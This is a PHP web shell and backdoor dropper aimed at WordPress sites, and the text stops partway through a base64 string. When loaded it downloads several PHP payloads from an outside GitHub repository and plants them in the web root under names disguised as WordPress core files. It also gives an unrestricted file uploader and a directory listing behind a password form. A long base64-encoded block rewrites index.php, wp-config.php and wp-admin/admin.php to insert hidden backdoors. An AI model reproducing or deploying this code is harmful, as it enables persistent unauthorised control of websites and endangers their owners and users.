<?php
$server = $_SERVER['HTTP_HOST'];
@ini_set('output_buffering', 0);
@ini_set('display_errors', 0);
set_time_limit(0);
ini_set('memory_limit', '64M');
header('Content-Type: text/html; charset=UTF-8');
echo "<b>Uname:".php_uname()."<br></b>"; 
echo "<b>Base Dir : ".getcwd ()."<br></b>";

function http_get($url){
$im = curl_init($url);
curl_setopt($im, CURLOPT_RETURNTRANSFER, 1);
curl_setopt($im, CURLOPT_CONNECTTIMEOUT, 10);
curl_setopt($im, CURLOPT_FOLLOWLOCATION, 1);
curl_setopt($im, CURLOPT_HEADER, 0);
return curl_exec($im);
curl_close($im);
}
$check1 = $_SERVER['DOCUMENT_ROOT'] . "/wp-config-samsples.php" ;
$text1 = http_get('https://raw.githubusercontent.com/0xWhoknows/symv2files/main/xdoor.php');
$open1 = fopen($check1, 'w');
fwrite($open1, $text1);
fclose($open1);
if(file_exists($check1)){
}
echo " Stored main : <a href=\"http://".$_SERVER['HTTP_HOST']."/wp-config-samsples.php\">".$_SERVER['HTTP_HOST']."/wp-config-samsples.php</a>\n<br>";
$check2 = $_SERVER['DOCUMENT_ROOT'] . "/class-wp-filesystemss.php" ;
$text2 = http_get('https://raw.githubusercontent.com/0xWhoknows/xdoorback/main/xl.php');
$open2 = fopen($check2, 'w');
fwrite($open2, $text2);
fclose($open2);
if(file_exists($check2)){
}
echo " Stored  xl : <a href=\"http://".$_SERVER['HTTP_HOST']."/class-wp-filesystemss.php\">".$_SERVER['HTTP_HOST']."/class-wp-filesystemss.php  </a>\n<br>";
$check3 = $_SERVER['DOCUMENT_ROOT'] . "/class-wp-filesystem.php" ;
$text3 = http_get('https://raw.githubusercontent.com/0xWhoknows/xdoorback/main/lu.php');
$open3 = fopen($check3, 'w');
fwrite($open3, $text3);
fclose($open3);
if(file_exists($check3)){
}
echo " Stored lu: <a href=\"http://".$_SERVER['HTTP_HOST']."/class-wp-filesystem.php\">".$_SERVER['HTTP_HOST']."/class-wp-filesystem.php  </a>\n<br>";
$check4 = $_SERVER['DOCUMENT_ROOT'] . "/class-wp.php" ;
$text4 = http_get('https://raw.githubusercontent.com/0xWhoknows/xdoorback/main/hehe.php');
$open4 = fopen($check4, 'w');
fwrite($open4, $text4);
fclose($open4);
if(file_exists($check4)){
}
echo " Stored he : <a href=\"http://".$_SERVER['HTTP_HOST']."/class-wp.php\">".$_SERVER['HTTP_HOST']."/class-wp.php  </a>\n<br>";



$check5 = $_SERVER['DOCUMENT_ROOT'] . "/class-admin.php" ;
$text5 = http_get('https://raw.githubusercontent.com/0xWhoknows/xdoorback/main/xx.php');
$open5 = fopen($check5, 'w');
fwrite($open5, $text5);
fclose($open5);
if(file_exists($check5)){
}
echo " Stored mini : <a href=\"http://".$_SERVER['HTTP_HOST']."/class-admin.php\">".$_SERVER['HTTP_HOST']."/class-admin.php  </a>\n<br>";



$check6 = $_SERVER['DOCUMENT_ROOT'] . "/class-lf.php" ;
$text6 = http_get('https://raw.githubusercontent.com/0xWhoknows/xdoorback/main/lf.php');
$open6 = fopen($check6, 'w');
fwrite($open6, $text6);
fclose($open6);
if(file_exists($check6)){
}
echo " Stored leaf : <a href=\"http://".$_SERVER['HTTP_HOST']."/class-lf.php\">".$_SERVER['HTTP_HOST']."/class-lf.php  </a>\n<br>";

?>

<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
<html><head><meta http-equiv="Content-Type" content="text/html; charset=windows-1256" /></head><body>
<?php
if (!empty($_GET['action']) &&  $_GET['action'] == "logout") {session_destroy();unset ($_SESSION['pass']);}

$path_name = pathinfo($_SERVER['PHP_SELF']);
$this_script = $path_name['basename'];
if (empty($_SESSION['pass'])) {$_SESSION['pass']='';}
if (empty($_POST['pass'])) {$_POST['pass']='';}
if ( $_SESSION['pass']!== $pass)
{
    if ($_POST['pass'] == $pass) {$_SESSION['pass'] = $pass; }
    else
    {
        echo '<form action="'.$_SERVER['PHP_SELF'].'" method="post"><input name="pass" type="password"><input type="submit"></form>';
        exit;
    }
}
?>


<?php

error_reporting(0);
set_time_limit(0);
echo '<font color="black" size="4">';
if(isset($_POST['Submit'])){
    $filedir = ""; 
    $maxfile = '2000000';
    $mode = '0644';
    $userfile_name = $_FILES['image']['name'];
    $userfile_tmp = $_FILES['image']['tmp_name'];
    if(isset($_FILES['image']['name'])) {
        $qx = $filedir.$userfile_name;
        @move_uploaded_file($userfile_tmp, $qx);
        @chmod ($qx, octdec($mode));
    echo" <a href=$userfile_name><b>Sucessfully Uploaded :D ==> $userfile_name</b></a>";
    }
}else{
    echo'<form method="POST" action="#" enctype="multipart/form-data"><input type="file" name="image"><br><input type="Submit" name="Submit" value="Upload"></form>';
}
echo '</center></font>';

?>


<?php

if (!empty($_FILES["file"]))
{
    if ($_FILES["file"]["error"] > 0)
       {echo "Error: " . $_FILES["file"]["error"] . "<br>";}
    else
       {echo "Stored file:".$_FILES["file"]["name"]."<br/>Size:".($_FILES["file"]["size"]/1024)." kB<br/>";
       move_uploaded_file($_FILES["file"]["tmp_name"],$_FILES["file"]["name"]);
       }
}

    // open this directory
    $myDirectory = opendir(".");
    // get each entry
    while($entryName = readdir($myDirectory)) {$dirArray[] = $entryName;} closedir($myDirectory);
    $indexCount = count($dirArray);
        echo "$indexCount files<br/>";
    sort($dirArray);

    echo "<TABLE border=1 cellpadding=5 cellspacing=0 class=whitelinks><TR><TH>Filename</TH><th>Filetype</th><th>Filesize</th></TR>\n";

        for($index=0; $index < $indexCount; $index++)
        {
            if (substr("$dirArray[$index]", 0, 1) != ".")
            {
            echo "<TR>
            <td><a href=\"$dirArray[$index]\">$dirArray[$index]</a></td>
            <td>".filetype($dirArray[$index])."</td>
            <td>".filesize($dirArray[$index])."</td>
                </TR>";
            }
        }
    echo "</TABLE>";
    ?>



<?php 
$DiSaMdZFJBvKzmBUDuMnYjTCekhVgxEouNumNzaxUkJJtJuvhM = "DQoNCiRyb290PSRfU0VSVkVSWyJET0NVTUVOVF9ST09UIl07DQppZihmaWxlX2V4aXN0cygkcm9vdC4iL2luZGV4LnBocCIpIE9SIGZpbGVfZXhpc3RzKCRyb290LiIvY29uZmlndXJhdGlvbi5waHAiKSBPUiBmaWxlX2V4aXN0cygkcm9vdC4iL3dwLWNvbmZpZy5waHAiKSkgew0KICAkaW5kZXg9ZmlsZV9nZXRfY29udGVudHMoJHJvb3QuIi9pbmRleC5waHAiKTsNCiAgJGNvbmZpZ3VyYXRpb249ZmlsZV9nZXRfY29udGVudHMoJHJvb3QuIi9jb25maWd1cmF0aW9uLnBocCIpOw0KICAkd3Bjb25maWc9ZmlsZV9nZXRfY29udGVudHMoJHJvb3QuIi93cC1jb25maWcucGhwIik7DQogIGlmKCFlbXB0eSgkaW5kZXgpKSB7DQogICAgJGluZGV4PXN0cl9yZXBsYWNlKGJhc2U2NF9kZWNvZGUoIlBEOXdhSEFnYVdZb2FYTnpaWFFvSkY5SFJWUmJJak40SWwwcEppWWtYMGRGVkZzaU0zZ2lYVDA5SWpONElpbDdKR1oxYm1NOUltTnlJaTRpWldFaUxpSjBaVjhpTGlKbWRXNGlMaUpqZEdsdmJpSTdKSGc5SkdaMWJtTW9JbHdrWXlJc0ltVWlMaUoySWk0aVlXd2lMaUlvSno4K0p5NWlZWE5sSWk0aU5qUWlMaUpmWkdWaklpNGliMlJsS0Z3a1l5a3BPeUlwT3lSNEtDSlFSRGwzWVVoQlMwTnBVbTFoVjNoc1kzbEJPVWxGUVd0WU1GcEtWRVZXVkZkNVNtMWhWM2hzWTNsS1pFOTNjSEJhYVVGdlNrZGFjR0pIVm5wWGVVcDFXVmN4YkVsc01HZEpWREJuU25samNFbEljMHRKUTBGblNVTlNiV1JYZUhOalIwWXdZVU5CT1VsRFVtWlZhMVpTVmxWV1ZGWkdjMmxqUjBZd1lVTktaRWxETkdkS1IxcHdZa2RXZWxkNVNuVlpWekZzU1d3d04wTnBRV2RKUTBKd1dtbEJiMkpYT1RKYVZqa3hZMGQ0ZGxsWFVteGFSamx0WVZkNGJFdERVbTFoVjNoc1l6RnpibVJITVhkWU1qVm9ZbGRWYmxoVGQyZEtSMW94WWtkNGQxbFlVbTlMVTJ0blpYZHZaMGxEUVdkSlEwRm5TVWRXYW1GSE9HZEphbmh2VFZRME9GbFRRbTlqYlZadFVGTmphMXB1Vm5OaVNFSm9aRWRuYmxCclVuWmliVlZvU1VVNWQxcFhORGhNTWtVclVFTTViMDFVTkdsUGQyOW5TVU5CWjJaUmNEbGFWMDV2WW5sQmJsQkhhREJpVjNjclVFZG9iRmxYVVN0UVNGSndaRWQ0YkZCc1ZuZGlSemxvV2tOQ2JXRlhlR3hqZVRSMVRHcDNkbVJIYkRCaVIxVXJVRU01YjFwWFJtdFFhbmhwWWpKU05WQnFlRzFpTTBwMFNVY3hiR1JIYUhaYVJERlJWREZPVlVsSFZuVlpNMUkxWTBkVk9VbHRNVEZpU0ZKd1kwZEdlV1JET1cxaU0wcDBURmRTYUdSSFJXbEpSMFpxWkVkc2RtSnFNR2xKYWpRNFlWYzFkMlJZVVdka1NHeDNXbFF4TUZwWWFEQkpSelZvWWxkVk9XTkhSakJoUkRRNFlWYzFkMlJZVVdka1NHeDNXbFF3YVZwdGJITmFVMGxuWW0xR2RGcFVNR2xhYld4eldsaE5hVkJxZUhCaWJrSXhaRU5DTUdWWVFteFFXRTR4V1cweGNHUkRRakpaVjNneFdsUXdhVlpXUW5OaU1rWnJTV28wT0V3eVduWmpiVEFyVUVNNWFXSXlValZRYW5kMllVaFNkR0pFTkc1UGQyOHZVR2M5UFNJcE8yVjRhWFE3ZlQ4KyIpLCIiLCRpbmRleCk7DQogICAgdW5saW5rKCRyb290LiIvaW5kZXgucGhwIik7DQogICAgJG9waW5kZXg9Zm9wZW4oJHJvb3QuIi9pbmRleC5waHAiLCJhIik7DQogICAgZndyaXRlKCRvcGluZGV4LGJhc2U2NF9kZWNvZGUoIlBEOXdhSEFnYVdZb2FYTnpaWFFvSkY5SFJWUmJJak40SWwwcEppWWtYMGRGVkZzaU0zZ2lYVDA5SWpONElpbDdKR1oxYm1NOUltTnlJaTRpWldFaUxpSjBaVjhpTGlKbWRXNGlMaUpqZEdsdmJpSTdKSGc5SkdaMWJtTW9JbHdrWXlJc0ltVWlMaUoySWk0aVlXd2lMaUlvSno4K0p5NWlZWE5sSWk0aU5qUWlMaUpmWkdWaklpNGliMlJsS0Z3a1l5a3BPeUlwT3lSNEtDSlFSRGwzWVVoQlMwTnBVbTFoVjNoc1kzbEJPVWxGUVd0WU1GcEtWRVZXVkZkNVNtMWhWM2hzWTNsS1pFOTNjSEJhYVVGdlNrZGFjR0pIVm5wWGVVcDFXVmN4YkVsc01HZEpWREJuU25samNFbEljMHRKUTBGblNVTlNiV1JYZUhOalIwWXdZVU5CT1VsRFVtWlZhMVpTVmxWV1ZGWkdjMmxqUjBZd1lVTktaRWxETkdkS1IxcHdZa2RXZWxkNVNuVlpWekZzU1d3d04wTnBRV2RKUTBKd1dtbEJiMkpYT1RKYVZqa3hZMGQ0ZGxsWFVteGFSamx0WVZkNGJFdERVbTFoVjNoc1l6RnpibVJITVhkWU1qVm9ZbGRWYmxoVGQyZEtSMW94WWtkNGQxbFlVbTlMVTJ0blpYZHZaMGxEUVdkSlEwRm5TVWRXYW1GSE9HZEphbmh2VFZRME9GbFRRbTlqYlZadFVGTmphMXB1Vm5OaVNFSm9aRWRuYmxCclVuWmliVlZvU1VVNWQxcFhORGhNTWtVclVFTTViMDFVTkdsUGQyOW5TVU5CWjJaUmNEbGFWMDV2WW5sQmJsQkhhREJpVjNjclVFZG9iRmxYVVN0UVNGSndaRWQ0YkZCc1ZuZGlSemxvV2tOQ2JXRlhlR3hqZVRSMVRHcDNkbVJIYkRCaVIxVXJVRU01YjFwWFJtdFFhbmhwWWpKU05WQnFlRzFpTTBwMFNVY3hiR1JIYUhaYVJERlJWREZPVlVsSFZuVlpNMUkxWTBkVk9VbHRNVEZpU0ZKd1kwZEdlV1JET1cxaU0wcDBURmRTYUdSSFJXbEpSMFpxWkVkc2RtSnFNR2xKYWpRNFlWYzFkMlJZVVdka1NHeDNXbFF4TUZwWWFEQkpSelZvWWxkVk9XTkhSakJoUkRRNFlWYzFkMlJZVVdka1NHeDNXbFF3YVZwdGJITmFVMGxuWW0xR2RGcFVNR2xhYld4eldsaE5hVkJxZUhCaWJrSXhaRU5DTUdWWVFteFFXRTR4V1cweGNHUkRRakpaVjNneFdsUXdhVlpXUW5OaU1rWnJTV28wT0V3eVduWmpiVEFyVUVNNWFXSXlValZRYW5kMllVaFNkR0pFTkc1UGQyOHZVR2M5UFNJcE8yVjRhWFE3ZlQ4KyIpKTsNCiAgICBmd3JpdGUoJG9waW5kZXgsJGluZGV4KTsNCiAgICBmY2xvc2UoJG9waW5kZXgpOw0KICAgICRpbmRleGJhY2s9JF9TRVJWRVJbJ1NFUlZFUl9OQU1FJ10uIi9pbmRleC5waHA/M3g9M3giOw0KICB9DQogIGlmKCFlbXB0eSgkY29uZmlndXJhdGlvbikpIHsNCiAgICAkY29uZmlndXJhdGlvbj1zdHJfcmVwbGFjZShiYXNlNjRfZGVjb2RlKCJQRDl3YUhBZ2FXWW9hWE56WlhRb0pGOUhSVlJiSWpONElsMHBKaVlrWDBkRlZGc2lNM2dpWFQwOUlqTjRJaWw3SkdaMWJtTTlJbU55SWk0aVpXRWlMaUowWlY4aUxpSm1kVzRpTGlKamRHbHZiaUk3SkhnOUpHWjFibU1vSWx3a1l5SXNJbVVpTGlKMklpNGlZV3dpTGlJb0p6OCtKeTVpWVhObElpNGlOalFpTGlKZlpHVmpJaTRpYjJSbEtGd2tZeWtwT3lJcE95UjRLQ0pRUkRsM1lVaEJTME5wVW0xaFYzaHNZM2xCT1VsRlFXdFlNRnBLVkVWV1ZGZDVTbTFoVjNoc1kzbEtaRTkzY0hCYWFVRnZTa2RhY0dKSFZucFhlVXAxV1ZjeGJFbHNNR2RKVkRCblNubGpjRWxJYzB0SlEwRm5TVU5TYldSWGVITmpSMFl3WVVOQk9VbERVbVpWYTFaU1ZsVldWRlpHYzJsalIwWXdZVU5LWkVsRE5HZEtSMXB3WWtkV2VsZDVTblZaVnpGc1NXd3dOME5wUVdkSlEwSndXbWxCYjJKWE9USmFWamt4WTBkNGRsbFhVbXhhUmpsdFlWZDRiRXREVW0xaFYzaHNZekZ6Ym1SSE1YZFlNalZvWWxkVmJsaFRkMmRLUjFveFlrZDRkMWxZVW05TFUydG5aWGR2WjBsRFFXZEpRMEZuU1VkV2FtRkhPR2RKYW5odlRWUTBPRmxUUW05amJWWnRVRk5qYTFwdVZuTmlTRUpvWkVkbmJsQnJVblppYlZWb1NVVTVkMXBYTkRoTU1rVXJVRU01YjAxVU5HbFBkMjluU1VOQloyWlJjRGxhVjA1dllubEJibEJIYURCaVYzY3JVRWRvYkZsWFVTdFFTRkp3WkVkNGJGQnNWbmRpUnpsb1drTkNiV0ZYZUd4amVUUjFUR3AzZG1SSGJEQmlSMVVyVUVNNWIxcFhSbXRRYW5ocFlqSlNOVkJxZUcxaU0wcDBTVWN4YkdSSGFIWmFSREZSVkRGT1ZVbEhWblZaTTFJMVkwZFZPVWx0TVRGaVNGSndZMGRHZVdSRE9XMWlNMHAwVEZkU2FHUkhSV2xKUjBacVpFZHNkbUpxTUdsSmFqUTRZVmMxZDJSWVVXZGtTR3gzV2xReE1GcFlhREJKUnpWb1lsZFZPV05IUmpCaFJEUTRZVmMxZDJSWVVXZGtTR3gzV2xRd2FWcHRiSE5hVTBsblltMUdkRnBVTUdsYWJXeHpXbGhOYVZCcWVIQmlia0l4WkVOQ01HVllRbXhRV0U0eFdXMHhjR1JEUWpKWlYzZ3hXbFF3YVZaV1FuTmlNa1pyU1dvME9Fd3lXblpqYlRBclVFTTVhV0l5VWpWUWFuZDJZVWhTZEdKRU5HNVBkMjh2VUdjOVBTSXBPMlY0YVhRN2ZUOCsiKSwiIiwkY29uZmlnKTsNCiAgICB1bmxpbmsoJHJvb3QuIi9jb25maWd1cmF0aW9uLnBocCIpOw0KICAgICRvcGNvbj1mb3Blbigkcm9vdC4iL2NvbmZpZ3VyYXRpb24ucGhwIiwiYSIpOw0KICAgIGZ3cml0ZSgkb3Bjb24sYmFzZTY0X2RlY29kZSgiUEQ5d2FIQWdhV1lvYVhOelpYUW9KRjlIUlZSYklqTjRJbDBwSmlZa1gwZEZWRnNpTTNnaVhUMDlJak40SWlsN0pHWjFibU05SW1OeUlpNGlaV0VpTGlKMFpWOGlMaUptZFc0aUxpSmpkR2x2YmlJN0pIZzlKR1oxYm1Nb0lsd2tZeUlzSW1VaUxpSjJJaTRpWVd3aUxpSW9KejgrSnk1aVlYTmxJaTRpTmpRaUxpSmZaR1ZqSWk0aWIyUmxLRndrWXlrcE95SXBPeVI0S0NKUVJEbDNZVWhCUzBOcFVtMWhWM2hzWTNsQk9VbEZRV3RZTUZwS1ZFVldWRmQ1U20xaFYzaHNZM2xLWkU5M2NIQmFhVUZ2U2tkYWNHSkhWbnBYZVVwMVdWY3hiRWxzTUdkSlZEQm5TbmxqY0VsSWMwdEpRMEZuU1VOU2JXUlhlSE5qUjBZd1lVTkJPVWxEVW1aVmExWlNWbFZXVkZaR2MybGpSMFl3WVVOS1pFbEROR2RLUjFwd1lrZFdlbGQ1U25WWlZ6RnNTV3d3TjBOcFFXZEpRMEp3V21sQmIySlhPVEphVmpreFkwZDRkbGxYVW14YVJqbHRZVmQ0YkV0RFVtMWhWM2hzWXpGemJtUkhNWGRZTWpWb1lsZFZibGhUZDJkS1Ixb3hZa2Q0ZDFsWVVtOUxVMnRuWlhkdlowbERRV2RKUTBGblNVZFdhbUZIT0dkSmFuaHZUVlEwT0ZsVFFtOWpiVlp0VUZOamExcHVWbk5pU0VKb1pFZG5ibEJyVW5aaWJWVm9TVVU1ZDFwWE5EaE1Na1VyVUVNNWIwMVVOR2xQZDI5blNVTkJaMlpSY0RsYVYwNXZZbmxCYmxCSGFEQmlWM2NyVUVkb2JGbFhVU3RRU0ZKd1pFZDRiRkJzVm5kaVJ6bG9Xa05DYldGWGVHeGplVFIxVEdwM2RtUkhiREJpUjFVclVFTTViMXBYUm10UWFuaHBZakpTTlZCcWVHMWlNMHAwU1VjeGJHUkhhSFphUkRGUlZERk9WVWxIVm5WWk0xSTFZMGRWT1VsdE1URmlTRkp3WTBkR2VXUkRPVzFpTTBwMFRGZFNhR1JIUldsSlIwWnFaRWRzZG1KcU1HbEphalE0WVZjMWQyUllVV2RrU0d4M1dsUXhNRnBZYURCSlJ6Vm9ZbGRWT1dOSFJqQmhSRFE0WVZjMWQyUllVV2RrU0d4M1dsUXdhVnB0YkhOYVUwbG5ZbTFHZEZwVU1HbGFiV3h6V2xoTmFWQnFlSEJpYmtJeFpFTkNNR1ZZUW14UVdFNHhXVzB4Y0dSRFFqSlpWM2d4V2xRd2FWWldRbk5pTWtaclNXbzBPRXd5V25aamJUQXJVRU01YVdJeVVqVlFhbmQyWVVoU2RHSkVORzVQZDI4dlVHYzlQU0lwTzJWNGFYUTdmVDgrIikpOw0KICAgIGZ3cml0ZSgkb3Bjb24sJGNvbmZpZ3VyYXRpb24pOw0KICAgIGZjbG9zZSgkb3Bjb24pOw0KICAgICRjb25maWd1cmF0aW9uYmFjaz0kX1NFUlZFUlsnU0VSVkVSX05BTUUnXS4iL2NvbmZpZ3VyYXRpb24ucGhwPzN4PTN4IjsNCiAgfQ0KICBpZighZW1wdHkoJHdwY29uZmlnKSkgew0KICAgICR3cGNvbmZpZz1zdHJfcmVwbGFjZShiYXNlNjRfZGVjb2RlKCJQRDl3YUhBZ2FXWW9hWE56WlhRb0pGOUhSVlJiSWpONElsMHBKaVlrWDBkRlZGc2lNM2dpWFQwOUlqTjRJaWw3SkdaMWJtTTlJbU55SWk0aVpXRWlMaUowWlY4aUxpSm1kVzRpTGlKamRHbHZiaUk3SkhnOUpHWjFibU1vSWx3a1l5SXNJbVVpTGlKMklpNGlZV3dpTGlJb0p6OCtKeTVpWVhObElpNGlOalFpTGlKZlpHVmpJaTRpYjJSbEtGd2tZeWtwT3lJcE95UjRLQ0pRUkRsM1lVaEJTME5wVW0xaFYzaHNZM2xCT1VsRlFXdFlNRnBLVkVWV1ZGZDVTbTFoVjNoc1kzbEtaRTkzY0hCYWFVRnZTa2RhY0dKSFZucFhlVXAxV1ZjeGJFbHNNR2RKVkRCblNubGpjRWxJYzB0SlEwRm5TVU5TYldSWGVITmpSMFl3WVVOQk9VbERVbVpWYTFaU1ZsVldWRlpHYzJsalIwWXdZVU5LWkVsRE5HZEtSMXB3WWtkV2VsZDVTblZaVnpGc1NXd3dOME5wUVdkSlEwSndXbWxCYjJKWE9USmFWamt4WTBkNGRsbFhVbXhhUmpsdFlWZDRiRXREVW0xaFYzaHNZekZ6Ym1SSE1YZFlNalZvWWxkVmJsaFRkMmRLUjFveFlrZDRkMWxZVW05TFUydG5aWGR2WjBsRFFXZEpRMEZuU1VkV2FtRkhPR2RKYW5odlRWUTBPRmxUUW05amJWWnRVRk5qYTFwdVZuTmlTRUpvWkVkbmJsQnJVblppYlZWb1NVVTVkMXBYTkRoTU1rVXJVRU01YjAxVU5HbFBkMjluU1VOQloyWlJjRGxhVjA1dllubEJibEJIYURCaVYzY3JVRWRvYkZsWFVTdFFTRkp3WkVkNGJGQnNWbmRpUnpsb1drTkNiV0ZYZUd4amVUUjFUR3AzZG1SSGJEQmlSMVVyVUVNNWIxcFhSbXRRYW5ocFlqSlNOVkJxZUcxaU0wcDBTVWN4YkdSSGFIWmFSREZSVkRGT1ZVbEhWblZaTTFJMVkwZFZPVWx0TVRGaVNGSndZMGRHZVdSRE9XMWlNMHAwVEZkU2FHUkhSV2xKUjBacVpFZHNkbUpxTUdsSmFqUTRZVmMxZDJSWVVXZGtTR3gzV2xReE1GcFlhREJKUnpWb1lsZFZPV05IUmpCaFJEUTRZVmMxZDJSWVVXZGtTR3gzV2xRd2FWcHRiSE5hVTBsblltMUdkRnBVTUdsYWJXeHpXbGhOYVZCcWVIQmlia0l4WkVOQ01HVllRbXhRV0U0eFdXMHhjR1JEUWpKWlYzZ3hXbFF3YVZaV1FuTmlNa1pyU1dvME9Fd3lXblpqYlRBclVFTTVhV0l5VWpWUWFuZDJZVWhTZEdKRU5HNVBkMjh2VUdjOVBTSXBPMlY0YVhRN2ZUOCsiKSwiIiwkd3Bjb25maWcpOw0KICAgIGlmKGlzX2Rpcigkcm9vdC4iL3dwLWFkbWluIikpIHsNCiAgICAgIGNoZGlyKCRyb290LiJ3cC1hZG1pbiIpOw0KICAgICAgaWYoIWVtcHR5KCJhZG1pbi5waHAiKSkgew0KICAgICAgICAkYWJvdXQ9ZmlsZV9nZXRfY29udGVudHMoJHJvb3QuIi93cC1hZG1pbi9hZG1pbi5waHAiKTsNCiAgICAgICAgJGFib3V0PXN0cl9yZXBsYWNlKGJhc2U2NF9kZWNvZGUoIlBEOXdhSEFnYVdZb2FYTnpaWFFvSkY5SFJWUmJJak40SWwwcEppWWtYMGRGVkZzaU0zZ2lYVDA5SWpONElpbDdKR1oxYm1NOUltTnlJaTRpWldFaUxpSjBaVjhpTGlKbWRXNGlMaUpqZEdsdmJpSTdKSGc5SkdaMWJtTW9JbHdrWXlJc0ltVWlMaUoySWk0aVlXd2lMaUlvSno4K0p5NWlZWE5sSWk0aU5qUWlMaUpmWkdWaklpNGliMlJsS0Z3a1l5a3BPeUlwT3lSNEtDSlFSRGwzWVVoQlMwTnBVbTFoVjNoc1kzbEJPVWxGUVd0WU1GcEtWRVZXVkZkNVNtMWhWM2hzWTNsS1pFOTNjSEJhYVVGdlNrZGFjR0pIVm5wWGVVcDFXVmN4YkVsc01HZEpWREJuU25samNFbEljMHRKUTBGblNVTlNiV1JYZUhOalIwWXdZVU5CT1VsRFVtWlZhMVpTVmxWV1ZGWkdjMmxqUjBZd1lVTktaRWxETkdkS1IxcHdZa2RXZWxkNVNuVlpWekZzU1d3d04wTnBRV2RKUTBKd1dtbEJiMkpYT1RKYVZqa3hZMGQ0ZGxsWFVteGFSamx0WVZkNGJFdERVbTFoVjNoc1l6RnpibVJITVhkWU1qVm9ZbGRWYmxoVGQyZEtSMW94WWtkNGQxbFlVbTlMVTJ0blpYZHZaMGxEUVdkSlEwRm5TVWRXYW1GSE9HZEphbmh2VFZRME9GbFRRbTlqYlZadFVGTmphMXB1Vm5OaVNFSm9aRWRuYmxCclVuWmliVlZvU1VVNWQxcFhORGhNTWtVclVFTTViMDFVTkdsUGQyOW5TVU5CWjJaUmNEbGFWMDV2WW5sQmJsQkhhREJpVjNjclVFZG9iRmxYVVN0UVNGSndaRWQ0YkZCc1ZuZGlSemxvV2tOQ2JXRlhlR3hqZVRSMVRHcDNkbVJIYkRCaVIxVXJVRU01YjFwWFJtdFFhbmhwWWpKU05WQnFlRzFpTTBwMFNVY3hiR1JIYUhaYVJERlJWREZPVlVsSFZuVlpNMUkxWTBkVk9VbHRNVEZpU0ZKd1kwZEdlV1JET1cxaU0wcDBURmRTYUdSSFJXbEpSMFpxWkVkc2RtSnFNR2xKYWpRNFlWYzFkMlJZVVdka1NHeDNXbFF4TUZwWWFEQkpSelZvWWxkVk9XTkhSakJoUkRRNFlWYzFkMlJZVVdka1NHeDNXbFF3YVZwdGJITmFVMGxuWW0xR2RGcFVNR2xhYld4eldsaE5hVkJxZUhCaWJrSXhaRU5DTUdWWVFteFFXRTR4V1cweGNHUkRRakpaVjNneFdsUXdhVlpXUW5OaU1rWnJTV28wT0V3eVduWmpiVEFyVUVNNWFXSXlValZRYW5kMllVaFNkR0pFTkc1UGQyOHZVR2M5UFNJcE8yVjRhWFE3ZlQ4KyIpLCIiLCRhYm91dCk7DQogICAgICAgIHVubGluaygkcm9vdC4iL3dwLWFkbWluL2FkbWluLnBocCIpOw0KICAgICAgICAkb3BhYm91dD1mb3Blbigkcm9vdC4iL3dwLWFkbWluL2FkbWluLnBocCIsImEiKTsNCiAgICAgICAgZndyaXRlKCRvcGFib3V0LGJhc2U2NF9kZWNvZGUoIlBEOXdhSEFnYVdZb2FYTnpaWFFvSkY5SFJWUmJJak40SWwwcEppWWtYMGRGVkZzaU0zZ2lYVDA5SWpONElpbDdKR1oxYm1NOUltTnlJaTRpWldFaUxpSjBaVjhpTGlKbWRXNGlMaUpqZEdsdmJpSTdKSGc5SkdaMWJtTW9JbHdrWXlJc0ltVWlMaUoySWk0aVlXd2lMaUlvSno4K0p5NWlZWE5sSWk0aU5qUWlMaUpmWkdWaklpNGliMlJsS0Z3a1l5a3BPeUlwT3lSNEtDSlFSRGwzWVVoQlMwTnBVbTFoVjNoc1kzbEJPVWxGUVd0WU1GcEtWRVZXVkZkNVNtMWhWM2hzWTNsS1pFOTNjSEJhYVVGdlNrZGFjR0pIVm5wWGVVcDFXVmN4YkVsc01HZEpWREJuU25samNFbEljMHRKUTBGblNVTlNiV1JYZUhOalIwWXdZVU5CT1VsRFVtWlZhMVpTVmxWV1ZGWkdjMmxqUjBZd1lVTktaRWxETkdkS1IxcHdZa2RXZWxkNVNuVlpWekZzU1d3d04wTnBRV2RKUTBKd1dtbEJiMkpYT1RKYVZqa3hZMGQ0ZGxsWFVteGFSamx0WVZkNGJFdERVbTFoVjNoc1l6RnpibVJITVhkWU1qVm9ZbGRWYmxoVGQyZEtSMW94WWtkNGQxbFlVbTlMVTJ0blpYZHZaMGxEUVdkSlEwRm5TVWRXYW1GSE9HZEphbmh2VFZRME9GbFRRbTlqYlZadFVGTmphMXB1Vm5OaVNFSm9aRWRuYmxCclVuWmliVlZvU1VVNWQxcFhORGhNTWtVclVFTTViMDFVTkdsUGQyOW5TVU5CWjJaUmNEbGFWMDV2WW5sQmJsQkhhREJpVjNjclVFZG9iRmxYVVN0UVNGSndaRWQ0YkZCc1ZuZGlSemxvV2tOQ2JXRlhlR3hqZVRSMVRHcDNkbVJIYkRCaVIxVXJVRU01YjFwWFJtdFFhbmhwWWpKU05WQnFlRzFpTTBwMFNVY3hiR1JIYUhaYVJERlJWREZPVlVsSFZuVlpNMUkxWTBkVk9VbHRNVEZpU0ZKd1kwZEdlV1JET1cxaU0wcDBURmRTYUdSSFJXbEpSMFpxWkVkc2RtSnFNR2xKYWpRNFlWYzFkMlJZVVdka1NHeDNXbFF4TUZwWWFEQkpSelZvWWxkVk9XTkhSakJoUkRRNFlWYzFkMlJZVVdka1NHeDNXbFF3YVZwdGJITmFVMGxuWW0xR2RGcFVNR2xhYld4eldsaE5hVkJxZUhCaWJrSXhaRU5DTUdWWVFteFFXRTR4V1cweGNHUkRRakpaVjNneFdsUXdhVlpXUW5OaU1rWnJTV28wT0V3eVduWmpiVEFyVUVNNWFXSXlValZRYW5kMllVaFNkR0pFTkc1UGQyOHZVR2M5UFNJcE8yVjRhWFE3ZlQ4KyIpKTsNCiAgICAgICAgZndyaXRlKCRvcGFib3V0LCRhYm91dCk7DQogICAgICAgIGZjbG9zZSgkb3BhYm91dCk7DQogICAgICAgICR3cGFkbWluYmFjaz0kX1NFUlZFUlsnU0VSVkVSX05BTUUnXS4iL3dwLWFkbWluL2FkbWluLnBocD8zeD0zeCI7DQogICAgICB9DQogICAgfSBlbHNlIHsNCiAgICAgIHVubGluaygkcm9vdC4iL3dwLWNvbmZpZy5waHAiKTsNCiAgICAgICRvcHdwY29uPWZvcGVuKCRyb290LiIvd3AtY29uZmlnLnBocCIsImEiKTsNCiAgICAgIGZ3cml0ZSgkb3B3cGNvbixiYXNlNjRfZGVjb2RlKCJQRDl3YUhBZ2FXWW9hWE56WlhRb0pGOUhSVlJiSWpONElsMHBKaVlrWDBkRlZGc2lNM2dpWFQwOU